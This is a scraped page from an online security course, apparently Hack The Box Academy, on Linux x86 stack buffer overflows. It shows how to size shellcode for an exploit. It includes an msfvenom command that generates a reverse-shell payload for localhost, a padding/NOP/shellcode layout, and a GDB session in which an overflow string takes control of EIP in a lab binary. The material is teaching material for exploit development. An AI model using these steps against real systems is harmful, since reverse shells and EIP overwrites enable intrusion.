<!--
 // Platform: Academy
// URL: https://academy.hackthebox.com/module/31/section/397
// Platform Version: V1
// Module ID: 31
// Module Name: Stack-Based Buffer Overflows on Linux x86
// Module Difficulty: Medium
// Section ID: 397
// Section Title: Determine the Length for Shellcode
// Page Title: Stack-Based Buffer Overflows on Linux x86
// Page Number: 07
-->

# Determine the Length for Shellcode

**Module Name:** Stack-Based Buffer Overflows on Linux x86 **Page Number:** 07

#### STACK-BASED BUFFER OVERFLOWS ON LINUX X86

# Determine the Length for Shellcode

#### Shellcode - Length

``` shell-session
[!bash!]$ msfvenom -p linux/x86/shell_reverse_tcp LHOST=127.0.0.1 lport=31337 --platform linux --arch x86 --format c

No encoder or badchars specified, outputting raw payload
Payload size: 68 bytes
<SNIP>
```

``` shell-session
Buffer = "\x55" * (1040 - 100 - 150 - 4) = 786
     NOPs = "\x90" * 100
Shellcode = "\x44" * 150
      EIP = "\x66" * 4
```

#### Buffer

![https://academy.hackthebox.com/storage/modules/31/buffer_overflow_8.png](https://academy.hackthebox.com/storage/modules/31/buffer_overflow_8.png)

#### GDB

``` shell-session
(gdb) run $(python -c 'print "\x55" * (1040 - 100 - 150 - 4) + "\x90" * 100 + "\x44" * 150 + "\x66" * 4')

The program being debugged has been started already.
Start it from the beginning? (y or n) y

Starting program: /home/student/bow/bow32 $(python -c 'print "\x55" * (1040 - 100 - 150 - 4) + "\x90" * 100 + "\x44" * 150 + "\x66" * 4')
Program received signal SIGSEGV, Segmentation fault.
0x66666666 in ?? ()
```

#### Buffer

![https://academy.hackthebox.com/storage/modules/31/buffer_overflow_7.png](https://academy.hackthebox.com/storage/modules/31/buffer_overflow_7.png)

# 

# 

#### Questions

####